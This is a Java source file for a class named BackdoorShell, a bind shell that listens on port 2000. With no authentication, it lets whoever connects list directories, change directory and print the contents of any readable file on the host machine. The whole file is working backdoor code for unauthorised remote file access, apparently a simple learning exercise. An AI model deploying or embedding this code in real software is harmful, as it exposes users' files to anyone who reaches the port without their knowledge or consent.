import java.io.IOException;

import java.io.File;
import java.io.InputStream;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.ServerSocket;
import Utility.DirectoryNotFoundException;
import Utility.FileNotFoundException;

public class BackdoorShell {

	private ServerSocket server;
	private Socket client;
	private File trmnlFile;

	private String prompt = System.getProperty("os.name").toLowerCase().contains("mac os") ? "%" : ">";
	private InputStream in;
	private OutputStream out;

	public BackdoorShell(int portNumber) throws IOException {

		this.server = new ServerSocket(portNumber);
		this.client = this.server.accept();
		this.in = this.client.getInputStream();
		this.out = this.client.getOutputStream();
		this.trmnlFile = new File(System.getProperty("user.dir"));

	}

	public static void main(String[] args) throws IOException {
		try {
			new BackdoorShell(2000).run();

		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public void run() throws IOException {
		String userInput;
		while (true) {
			printCurrentDirectory();
			userInput = readUserInput();

			System.out.println(userInput);

			if (userInput.equals("ls")) {
				listAllFiles();
			}

			else if (userInput.contains("cd")) {
				try {
					changeDirectory(userInput);
				} catch (DirectoryNotFoundException e) {
					out.write(e.getMessage().getBytes());
				}
			}

			else if (userInput.contains("cat")) {
				try {
					fileContent(userInput);
				} catch (FileNotFoundException e) {
					out.write(e.getMessage().getBytes());
				}
			}

		}
	}

	public void printCurrentDirectory() throws IOException {
		out.write((this.trmnlFile.getPath() + " " + prompt).getBytes());

	}

	public void changeDirectory(String command) throws IOException, DirectoryNotFoundException {
		if (command.equals("cd .")) {
			printCurrentDirectory();
		} else if (command.equals("cd ~")) {
			trmnlFile = new File(System.getProperty("user.dir"));

		} else if (command.equals("cd ..")) {
			trmnlFile = new File(trmnlFile.getParent());

		}

		else if (command.contains("cd")) {
			int index = command.indexOf(' ');
			String dir = command.substring(index + 1);
			trmnlFile = new File(trmnlFile.getPath() + File.separator + dir);

			if (!(trmnlFile.exists() && trmnlFile.isDirectory())) {
				trmnlFile = new File(trmnlFile.getParent());
				throw new DirectoryNotFoundException("Directory " + dir + " not found!\n");
			}

		}
	}

	public void listAllFiles() throws IOException {
		File[] filesInDir = trmnlFile.listFiles();

		for (File f : filesInDir) {
			if (!f.isDirectory()) {
				out.write((f.getName() + " - File").getBytes());
			} else {
				out.write((f.getName() + " - Directory").getBytes());
			}
			out.write((byte) 10);
		}
		out.write(("Total: " + filesInDir.length).getBytes());
		out.write((byte) 10);
	}

	public void fileContent(String fileName) throws IOException, FileNotFoundException {

		int index = fileName.indexOf(' ');
		String commandFile = fileName.substring(index + 1);
		trmnlFile = new File(trmnlFile.getPath() + File.separator + commandFile);

		if (!(trmnlFile.exists() && trmnlFile.isFile())) {
			trmnlFile = new File(trmnlFile.getParent());
			throw new FileNotFoundException("File " + commandFile + " not found!\n");
		}
		FileInputStream fileStream = new FileInputStream(trmnlFile);

		int bytesAvailable = fileStream.available();
		byte[] bytes = new byte[bytesAvailable];

		fileStream.read(bytes);
		out.write(bytes);
		out.flush();
		fileStream.close();
		trmnlFile = new File(trmnlFile.getParent());

	}

	public String readUserInput() throws IOException {
		int i;
		String text = new String();

		while ((i = in.read()) != 10) {
			if (i != 13) {
				text += (char) i;
			}

		}

		return text;

	}

}
